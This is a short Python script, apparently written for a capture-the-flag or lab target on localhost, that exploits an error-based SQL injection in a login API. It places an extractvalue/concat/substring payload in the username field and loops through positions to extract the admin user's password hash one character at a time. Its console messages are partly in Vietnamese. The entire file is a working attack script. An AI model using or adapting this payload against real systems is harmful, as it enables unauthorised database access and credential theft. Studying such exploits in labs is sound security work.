import requests
import re

BASE_URL = "http://127.0.0.1:1337/api/login"
HEADER = {
    "Content-Type": "application/json",
    "Origin": "http://127.0.0.1:1337",
    "Referer": "http://127.0.0.1:1337/"
}

def extract_char_value(pos):
    payload = f'" OR extractvalue(1,concat(0x7e,substring((SELECT password FROM users WHERE username=\'admin\'),{pos},1),0x7e)) -- -'
    data = {
        "username": payload,
        "password": "bl4ck0ut"
    }
    response = requests.post(BASE_URL, headers=HEADER, json=data)
    match = re.search(r"~([^~])~", response.text)
    if match:
        return match.group(1)
    else:
        print(f"[-] Failed Extract Value Hash")

def dump_hash_admin():
    hash_full = ""
    for pos in range(1, 33):
        char = extract_char_value(pos)
        if char:
            hash_full += char
            print(f"[+] Ký tự {pos}: {char}  =>  {hash_full}")
        else:
            print(f"[-] Không lấy được ký tự ở vị trí {pos}")
            break
    return hash_full

if __name__ == "__main__":
    print(f"[+] Bắt đầu extract giá trị hash")
    admin_hash = dump_hash_admin()
    print(f"[+] Done Found Hash Admin: \n{admin_hash}")